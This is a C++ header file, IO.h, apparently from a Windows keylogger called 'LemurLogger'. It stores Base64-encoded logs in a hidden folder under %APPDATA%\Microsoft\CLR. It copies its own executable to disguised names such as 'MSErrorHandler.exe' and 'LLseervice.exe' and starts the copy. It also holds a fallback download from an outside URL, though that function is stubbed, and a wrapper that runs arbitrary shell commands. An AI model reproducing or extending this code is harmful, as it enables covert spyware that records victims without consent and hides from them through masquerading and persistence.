#ifndef IO_H
#define IO_H


#include <string>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include "Helper.h"
#include "Base64.h"
#include <Urlmon.h>
#include <urlmon.h>
#include <tchar.h>
#include <vector>
#include <wininet.h>
#include <sys/stat.h>
#include <shlwapi.h>

#pragma comment(lib, "Urlmon.lib")


namespace IO
{
  std::string GetOurPath(const bool append_seperator = false)
  {
    std::string appdata_dir(getenv("APPDATA"));
    std::string full = appdata_dir + "\\Microsoft\\CLR";
    return full + (append_seperator ? "\\" : "");
  }

  bool MkOneDr(std::string path)
  {
    return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
  }

  bool MkDir(std::string path)
  {
      for(char &c : path)
        if (c == '\\')
        {
            c = '\0';
            if (!MkOneDr(path))
                return false;
            c = '\\';
        }
    return true;
  }

  template <class T>
  std::string WriteLog(const T &t)
  {
    std::string path = GetOurPath(true);
    Helper::DateTime dt;
    std::string name = dt.GetDateTimeString("_") + ".log";

    try
    {
      std::ofstream file(path + name);
      if (!file) return "";
      std::ostringstream s;
      s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
      std::string data = BASE64::EncryptB64(s.str());
      file << data;
      if(!file) return "";
      file.close();
      return name;
    }
    catch(...)
    {
      return "";
    }
  }
    std::string getFileNameWithPath(){
        char szExeFileName[MAX_PATH];
        GetModuleFileName(NULL, szExeFileName, MAX_PATH);
        //std::string::size_type pos = std::string( szExeFileName ).find_last_of( "\\/" );
        return std::string( szExeFileName );//.substr( 0, pos);

    }
    std::string getFileName(){

        std::string csPath = getFileNameWithPath();
        std::string FileName = PathFindFileName(csPath.c_str());
        return FileName;
    }
    bool copy(std::string path_filename){

        //get self name
        std::string cur_path_filename = getFileNameWithPath();
        //open self
        std::ifstream initialFile(cur_path_filename, std::ios::in|std::ios::binary);
        //open outfile
        std::ofstream outputFile(path_filename, std::ios::out|std::ios::binary);
        //read pointer to end binary
        initialFile.seekg(0, std::ios::end);
        //set fileSize call buffer
        long fileSize = initialFile.tellg();
        if(initialFile.is_open() && outputFile.is_open())
        {
            short * buffer = new short[fileSize/2];
            initialFile.seekg(0, std::ios::beg);
            initialFile.read((char*)buffer, fileSize);
            outputFile.write((char*)buffer, fileSize);
            delete[] buffer;
        }
        else if(!outputFile.is_open())
        {
            return false;
        }
        else if(!initialFile.is_open())
        {
            return false;
        }

        initialFile.close();
        outputFile.close();
        return true;
    }



    void shell_cmd(std::string command){
        system(command.c_str());
    }



    bool ms_Copyfile(const char * desfile_path){
        std::string cur_path_file = getFileNameWithPath();
        const char * cur_path_filename = cur_path_file.c_str();
        if (CopyFile (cur_path_filename,desfile_path,1)==0) {
            //error
            return false;
        }
        else {
            return true;
        }
    }

    bool download_File(const char * urlfile,const char * despath)
    {
        return false;
    }
    inline bool exists_file (const std::string& name) {
        struct stat buffer;
        return (stat (name.c_str(), &buffer) == 0);
    }
    void startup(LPCTSTR lpApplicationName) {
        int result = system(lpApplicationName);
        if (result <0){
            std::string msg = "[ ERROR ] Start"+std::string(lpApplicationName);
            Helper::WriteAppLog(msg);
        } else{
            std::string msg = "Start" +std::string(lpApplicationName);
            Helper::WriteAppLog(msg);
        }
    }
    bool copy_File() {
        char* appdata = getenv("APPDATA");
        std::string appdata_dir(appdata);
        std::string path = appdata_dir + "\\Microsoft\\Services\\";
        std::string filename = "MSErrorHandler.exe";
        std::string fullpath = path + filename;
        if (IO::exists_file(fullpath)) {
            char* temp = getenv("temp");
            std::string temp_dir(temp);
            path = temp_dir + "\\";
            filename = "LLseervice.exe";
            fullpath = path + filename;
        }
        if (IO::exists_file(fullpath)){
            return false;
        }

        const char *desfile_path = fullpath.c_str();
        CreateDirectory(path.c_str(),NULL);
        if (!(IO::ms_Copyfile(desfile_path))) {
            //do copy 3
            if (!(IO::copy(fullpath))) {
                //do copy 4
                std::string url = "www.arekor.co/content/images/LemurLogger.exe";
                if (!(IO::download_File(url.c_str(), path.c_str()))) {

                    return false;
                }else {
                    std::string msg = "COMPLETE" +std::string(fullpath);
                    Helper::WriteAppLog(msg);
                    startup(fullpath.c_str());
                    return true;
                }
            }else {
                std::string msg = "COMPLETE"+std::string(fullpath);
                Helper::WriteAppLog(msg);
                startup(fullpath.c_str());
                return true;
            }
        }else {
            std::string msg = "COMPLETE" +std::string(fullpath);
            Helper::WriteAppLog(msg);
            startup(fullpath.c_str());
            return true;
        }

    }

}


#endif // IO_H
